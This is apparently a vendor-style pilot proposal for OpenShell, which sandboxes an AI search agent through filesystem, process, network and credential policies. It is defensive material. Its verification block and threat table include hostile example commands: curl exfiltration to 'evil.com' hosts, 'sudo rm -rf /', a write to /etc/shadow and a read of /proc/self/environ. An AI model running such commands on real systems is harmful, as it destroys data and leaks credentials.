# OpenShell Pilot Proposal: Securing the AI Agent

## The Pitch

---

You have done it. You have officially developed a solution that will make a huge impact on the agility of your company through the usage of AI. You are ready to push the artifacts from staging into production, then — boom — all of a sudden you are blocked. Your production team (Operations or SRE) is concerned about security. These concerns are fully warranted. Valuable integrations come with risk. You want to bring the most feature-rich functionality, but you also don't want to make the news because someone exploited your application.

**What if there was a way to specifically define what an agent can and cannot do — before it ever touches production?**

This is where OpenShell provides value.

---

## The Problem

Your AI agent is a Streamlit application that uses a frontier model (OpenAI or Anthropic) to search resources across your entire company. It can read documentation, pull code references, query internal APIs, and synthesize answers. In staging, this works perfectly — you've tested the happy paths.

But in production, the agent has **no concept of boundaries**. It will:

- Read **any** file it's given access to — including `/etc/passwd`, environment variables containing API keys, or any configuration file with credentials
- Make outbound connections to **any** endpoint — including attacker-controlled domains if a prompt injection tricks the model into making a request
- Write to **any** writable directory — overwriting critical system files or exfiltrating data through seemingly innocent webroot writes
- Run with whatever privileges the container provides — potentially escalating to root if the container is misconfigured
- Access **every** credential that the model provider can see — because the agent has no way to distinguish between "you should read this" and "you should not read this"

The attack surface isn't just what you built. It's everything the agent **could** do if a single prompt is crafted wrong, or if the model behaves unexpectedly.

**Your production team is right to be concerned.** The agent doesn't know the difference between `/var/www/html` and `/etc/shadow`. It doesn't know that `POST /admin/delete` is off-limits. It doesn't know that `api.evil.com` is not a valid endpoint.

---

## Why OpenShell? Not SELinux, Not Firewalld, Not Just Containers

You might be thinking: *"We already have SELinux, Firewalld, and containerization. Why do we need another tool?"*

You're not wrong — those tools provide strong security. But they don't address the **unique risks of AI agents**:

| Tool | What It Does | What It Misses for AI Agents |
|---|---|---|
| **SELinux** | Mandatory access control on files and processes | Doesn't inspect HTTP requests, doesn't enforce L7 rules on LLM API calls, doesn't bind credentials to specific endpoints |
| **Firewalld** | Network port filtering | Only filters by port/protocol, not by HTTP method, path, or binary identity. Can't block `POST /admin` while allowing `GET /public` |
| **Containers** | Process isolation | Containers isolate but don't restrict what's *inside* the container. An agent with full filesystem access inside a container can still read/write anything the container allows |
| **OpenShell** | **All of the above, plus AI-specific controls** | **Filesystem via Landlock, Network with L7 HTTP inspection, Process identity reduction, and Provider credential binding — all through one declarative YAML policy** |

OpenShell brings a single policy that unifies all four protection layers. Instead of managing SELinux contexts, firewall rules, container security contexts, and credential management separately, you define **one YAML file** that describes exactly what your agent can do.

---

## How OpenShell Works: The Four Layers

OpenShell applies **defense in depth** across four policy domains. Each layer protects against a different attack vector, and together they cover the full risk profile of an AI agent.

### 1. Filesystem (`filesystem_policy`, `landlock`)

**What it protects:** Prevents reads and writes outside allowed paths.

**Why it matters for your agent:** Your agent reads company documentation, code, and internal resources. Without filesystem restrictions, it can also read `/etc/passwd`, `/proc/self/environ` (environment variables with API keys), and any file readable by the process.

**Example policy:**
```yaml
filesystem_policy:
  read_only:
    - /usr
    - /lib64
    - /etc
    - /proc
    - /dev/urandom
    - /opt/company-docs  # Your company documentation
  read_write:
    - /var/www/html      # Webroot for output only
    - /tmp
```

With `landlock.compatibility: hard_requirement`, the sandbox **fails to start** if any path is unavailable — ensuring the policy is never silently weakened.

**Risk mitigated:** Prompt injection tricks the agent into reading `/etc/shadow` or environment files containing credentials. → **Blocked by Landlock.**

### 2. Process (`process`)

**What it protects:** Blocks privilege escalation and dangerous syscalls.

**Why it matters for your agent:** The agent runs as a process inside a container. If the container runs as root, a compromised agent can escalate privileges, access host resources, or modify system configuration.

**Example policy:**
```yaml
process:
  run_as_user: "1001"
  run_as_group: "1001"
```

The agent runs as a non-root user with reduced capabilities. It cannot escalate to root, cannot modify system files, and cannot access host-level resources.

**Risk mitigated:** A model response instructs the agent to `sudo rm -rf /` or modify system configuration. → **Blocked — agent has no sudo privileges.**

### 3. Network (`network_policies`)

**What it protects:** Blocks unauthorized outbound connections. Enforces L7 HTTP method and path-level controls.

**Why it matters for your agent:** Your agent calls the LLM API (`api.openai.com` or `api.anthropic.com`) to generate responses. It should **only** be able to reach those specific endpoints. Without network policy, a prompt injection could make the agent call an attacker-controlled server and exfiltrate data.

**Example policy:**
```yaml
network_policies:
  openai_inference:
    name: openai-inference-readonly
    endpoints:
      - host: api.openai.com
        port: 443
        protocol: rest
        enforcement: enforce
        access: read-only
    binaries:
      - path: /usr/local/bin/python

  anthropic_inference:
    name: anthropic-inference-readonly
    endpoints:
      - host: api.anthropic.com
        port: 443
        protocol: rest
        enforcement: enforce
        access: read-only
    binaries:
      - path: /usr/local/bin/python
```

With L7 inspection (`protocol: rest`, `tls: terminate`), OpenShell can see the HTTP method and path. `GET` requests to the LLM API are allowed. `POST` to `admin/delete` is blocked. Even `POST` to `/chat/completions` on an unauthorized host is blocked.

**Risk mitigated:** Prompt injection tricks the agent into calling `http://evil.com/exfiltrate` with stolen data. → **Blocked — no matching network policy.** Or: Agent tries `POST` to an unauthorized endpoint. → **Blocked — L7 deny rule.**

### 4. Providers (`credential_binding`, provider profiles)

**What it protects:** Grants endpoint-bound credentials. Credentials are injected only after policy admits the request.

**Why it matters for your agent:** The agent needs API keys to call the LLM provider. Without provider controls, those credentials are available to the agent at all times — and could be leaked through a prompt injection or misconfigured endpoint.

OpenShell manages credentials as **providers**: named credential bundles that are injected into sandboxes at creation. Credentials never leak into the sandbox filesystem. They are injected as environment variables **only** when the sandbox makes a request to a profile-authorized endpoint.

**How it works:**
- Provider profile defines the authorized endpoints (`api.openai.com:443`)
- Credentials are bound to those endpoints
- When the agent calls `api.openai.com`, the proxy injects the credentials
- When the agent tries to call `api.evil.com`, no credentials are available — even if the request somehow bypassed the network policy

**Risk mitigated:** Agent tries to exfiltrate credentials to an unauthorized endpoint. → **No credentials are available for that endpoint.** Or: Agent attempts to use credentials on a different service than the LLM provider. → **Credential binding blocks it.**

---

## The Concrete Risk: Your Streamlit App

Your Streamlit application searches company resources. Here's what could go wrong without OpenShell:

| Threat | What Happens | OpenShell Layer That Stops It |
|---|---|---|
| **Prompt injection reads `/etc/environment`** | Agent extracts API keys from env vars | **Filesystem** — Landlock blocks reads outside allowed paths |
| **Agent exfiltrates data to attacker server** | Agent calls `curl http://evil.com/steal` | **Network** — No matching network policy, connection denied |
| **Agent escalates to root** | Agent runs `sudo` commands | **Process** — Agent runs as UID 1001, no sudo privileges |
| **Agent calls unauthorized internal API** | Agent discovers and calls `http://internal-api/admin/delete` | **Network** — L7 policy blocks non-whitelisted endpoints |
| **Agent leaks LLM credentials** | Agent reads `LLM_API_KEY` and sends it elsewhere | **Providers** — Credentials bound only to authorized endpoints |
| **Agent writes to `/etc/crontab`** | Agent modifies system scheduling | **Filesystem** — `/etc` is read-only |
| **Agent makes `DELETE` requests** | Agent destroys data via the LLM API | **Network** — `access: read-only` blocks `DELETE`, `POST` |

---

## The Pilot: One RHEL Server, Under One Hour

Here's the key question from your production team: **"Can we run this on a single RHEL server without Kubernetes?"**

**Yes.** OpenShell runs natively on RHEL using rootless Podman. No cluster, no orchestration, no outside infrastructure needed.

### Architecture

```
┌──────────────────────────────────────────────────────────┐
│                    RHEL Server                             │
│                                                          │
│  ┌──────────────────────────────────────────────────┐    │
│  │  OpenShell Sandbox (Podman container)            │    │
│  │                                                  │    │
│  │  ┌──────────────────────────────────────────┐    │    │
│  │  │  Streamlit Agent                         │    │    │
│  │  │  ├── Filesystem: Landlock enforced      │    │    │
│  │  │  ├── Process: Non-root user (UID 1001)  │    │    │
│  │  │  ├── Network: L7 proxy enforced         │    │    │
│  │  │  └── Providers: Endpoint-bound creds    │    │    │
│  │  └──────────────────────────────────────────┘    │    │
│  │                                                  │    │
│  │  ┌──────────────────────────────────────────┐    │    │
│  │  │  OpenShell Local Gateway                 │    │    │
│  │  │  (policy enforcement, sandbox lifecycle) │    │    │
│  │  └──────────────────────────────────────────┘    │    │
│  └──────────────────────────────────────────────────┘    │
│                                                          │
└──────────────────────────────────────────────────────────┘
```

### One-Hour Pilot Plan

| Minute | Step | Command |
|---|---|---|
| 0-5 | Install OpenShell | `curl -LsSf https://raw.githubusercontent.com/NVIDIA/OpenShell/main/install.sh \| sh` |
| 5-10 | Pull the container image | `podman build -t agent-policy-demo -f Containerfile .` |
| 10-15 | Create the policy file | `cat > policy.yaml << 'EOF' ...` |
| 15-20 | Create sandbox | `openshell sandbox create --name demo --from agent-policy-demo -- claude` |
| 20-25 | Apply the policy | `openshell policy set demo --policy policy.yaml --wait` |
| 25-30 | Verify protection | `openshell sandbox connect demo` → test each layer |
| 30-45 | **Demonstrate the attack scenarios** | Show what happens when the agent tries to bypass each layer |
| 45-60 | **Document results** | Show production team the policy, the denials, and the audit logs |

### Verify Each Layer

```bash
# Filesystem — blocked
echo "test" > /etc/shadow          # BLOCKED by Landlock
cat /proc/self/environ             # BLOCKED — /proc is read-only

# Process — blocked
sudo rm -rf /                      # BLOCKED — no sudo privileges
whoami                             # Returns "1001"

# Network — blocked
curl https://api.evil.com/exfil    # BLOCKED — no matching network policy
curl -X POST https://api.openai.com/...  # BLOCKED — read-only access
curl -s https://api.openai.com/zen       # ALLOWED — read-only GET

# Providers — blocked
# Credentials not available for unauthorized endpoints
```

---

## The Policy File That Protects Your Agent

See `openshell-lab/policies/openshell-four-layers.yaml` for the complete policy.

```yaml
version: 1

# LAYER 1: Filesystem — Landlock kernel-level path restrictions
filesystem_policy:
  read_only: [/usr, /lib64, /etc, /proc, /dev/urandom]
  read_write: [/var/www/html, /tmp, /dev/null]
landlock:
  compatibility: hard_requirement

# LAYER 2: Process — Unprivileged agent identity
process:
  run_as_user: "1001"
  run_as_group: "1001"

# LAYER 3: Network — L7 HTTP method/path enforcement
network_policies:
  openai_inference:
    name: openai-inference-readonly
    endpoints:
      - host: api.openai.com
        port: 443
        protocol: rest
        access: read-only
    binaries:
      - path: /usr/local/bin/python
  anthropic_inference:
    name: anthropic-inference-readonly
    endpoints:
      - host: api.anthropic.com
        port: 443
        protocol: rest
        access: read-only
    binaries:
      - path: /usr/local/bin/python

# LAYER 4: Providers — Endpoint-bound credentials
# Attach provider profiles with credentials bound to specific endpoints.
# Credentials are injected ONLY when policy admits the request.
# See: openshell provider create --type openai --from-existing
```

---

## Why This Pilot Works

| Concern from Production | OpenShell Answer |
|---|---|
| **"Is this too complex?"** | One YAML policy file. No SELinux contexts, no firewall rules, no security contexts to manage. |
| **"Can we roll this back?"** | `openshell policy set` reverts to the previous policy instantly. No restart needed. |
| **"What if it breaks?"** | `enforcement: audit` mode logs violations without blocking. Test the policy before enforcing it. |
| **"Does it need Kubernetes?"** | No. Runs on a single RHEL server with rootless Podman. |
| **"How long to set up?"** | Under one hour on a single RHEL server. |
| **"Can we see what it blocks?"** | `openshell logs demo --level warn` shows every denied connection with the binary, destination, and reason. |
| **"Does it protect credentials?"** | Yes. Provider credentials are injected only for authorized endpoints and never touch the filesystem. |
| **"Can we scale this?"** | The policy is portable. Same policy works on RHEL, Podman, Docker, or Kubernetes. |

---

## Next Steps

1. **Review the policy**: `openshell-lab/policies/openshell-four-layers.yaml`
2. **Run the pilot**: Follow the one-hour plan on a single RHEL server
3. **Show the denials**: Use `openshell logs` to demonstrate what OpenShell blocks
4. **Present to production team**: Show the policy, the audit trail, and the risk reduction
5. **Iterate**: Use `enforcement: audit` mode first, then switch to `enforce` when ready

---

**The bottom line:** Your agent does amazing things. OpenShell makes sure it only does **the** things you intend — and nothing else. One policy file, four protection layers, zero Kubernetes, one hour to pilot.
